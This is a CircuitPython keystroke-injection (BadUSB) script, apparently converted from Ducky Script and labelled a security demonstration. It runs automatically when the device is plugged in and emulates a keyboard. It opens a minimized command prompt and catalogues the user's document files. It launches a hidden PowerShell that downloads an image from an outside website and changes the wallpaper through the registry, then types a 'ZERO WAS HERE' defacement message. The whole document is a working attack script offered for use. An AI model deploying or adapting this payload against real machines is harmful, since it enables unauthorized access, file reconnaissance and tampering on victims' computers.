"""
Happy Frog - Production CircuitPython Code
Generated from Happy Frog Script

This code will execute automatically when the device is plugged in.
Educational comments show what each command does.
"""

import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Initialize HID devices
kbd = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(kbd)
# Production code - executes immediately on device boot/plug-in
# ATTACKMODE HID STORAGE detected - running payload automatically

# Wait for system to recognize the device
time.sleep(2)

#  Happy Frog Script - Converted from Ducky Script

#  Original source: ducky.txt

#  Educational conversion - review all commands before execution

#  BadUSB Demo: Open Terminal, Notepad, and type a message

    # ATTACKMODE: Configured for HID emulation (HID STORAGE)
    # Note: This device is configured as a HID keyboard/mouse
    # Configuration: HID STORAGE

time.sleep(2.0)  # Delay 2000ms

#  Open File Explorer

kbd.press(Keycode.GUI)  # Press MOD
kbd.press(Keycode.E)  # Press e
kbd.release(Keycode.E)  # Release e
kbd.release(Keycode.GUI)  # Release MOD

time.sleep(1.0)  # Delay 1000ms

#  Open Hidden Command Prompt

kbd.press(Keycode.GUI)  # Press MOD
kbd.press(Keycode.R)  # Press r
kbd.release(Keycode.R)  # Release r
kbd.release(Keycode.GUI)  # Release MOD

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("start /min cmd")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.5)  # Delay 1500ms

#  Create "Demo" directory and files in one reliable command

keyboard_layout.write("mkdir \"%USERPROFILE%\\Desktop\\Demo\" 2>nul && echo Demo file created at %date% %time% > \"%USERPROFILE%\\Desktop\\Demo\\README.txt\" && echo This is a security demonstration file. > \"%USERPROFILE%\\Desktop\\Demo\\demo.txt\" && echo If you can read this, your system was accessed via HID device. > \"%USERPROFILE%\\Desktop\\Demo\\warning.txt\"")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.0)  # Delay 1000ms

#  Search for common document types (globally usable)

keyboard_layout.write("for /r \"%USERPROFILE%\\Documents\" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> \"%USERPROFILE%\\Desktop\\Demo\\file_list.txt\"")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.0)  # Delay 1000ms

keyboard_layout.write("for /r \"%USERPROFILE%\\Desktop\" %f in (*.doc *.docx *.pdf *.txt) do @echo Found: %f >> \"%USERPROFILE%\\Desktop\\Demo\\file_list.txt\"")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.0)  # Delay 1000ms

#  Change wallpaper to hacker skull (stealth version)

keyboard_layout.write("Start-Process powershell -WindowStyle Hidden -ArgumentList \"-NoProfile\", \"-NonInteractive\", \"-Command\", \"powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command \"Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\\Desktop\\Demo\\wallpaper.jpg; reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\\Desktop\\Demo\\wallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters\"\" -Wait")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(3.0)  # Delay 3000ms

#  Open Notepad

kbd.press(Keycode.GUI)  # Press MOD
kbd.press(Keycode.R)  # Press r
kbd.release(Keycode.R)  # Release r
kbd.release(Keycode.GUI)  # Release MOD

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("notepad")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.5)  # Delay 1500ms

#  Type simple hacker message in Notepad (replacing ASCII art)

keyboard_layout.write("ZERO WAS HERE")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("never trust an open machine")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("*** DEMO: Demo files have been created. This is a security demonstration. ***")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("To protect your data, always lock your machine and use strong passwords.")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("This was a demo. Next time, don't plug in random USB drives or borrow chargers!")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

#  Conversion completed by Happy Frog

#  Remember: Use only for educational purposes and authorized testing!


"""
End of Happy Frog Generated Code
"""